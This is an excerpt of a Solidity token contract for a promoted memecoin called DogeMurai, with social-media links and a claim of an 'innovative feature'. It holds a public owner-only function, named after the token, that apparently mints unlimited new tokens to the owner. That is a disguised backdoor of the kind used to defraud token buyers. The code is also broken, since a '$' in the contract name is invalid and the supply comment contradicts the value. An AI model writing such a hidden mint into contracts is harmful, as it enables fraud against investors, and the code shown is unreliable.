...
//
// $DogeMurai proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/DogeMurai
//   🌐 Website:    https://Dogemurai.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _DogeMurai(uint256 amount) public onlyOwner {
 _DogeMurai(msg.sender, amount);
    }
    ...
    function _DogeMurai(address account, uint256 amount) internal virtual {
...
contract $DogeMurai is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Doge Murai", "DMURAI") {
     _DogeMurai(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}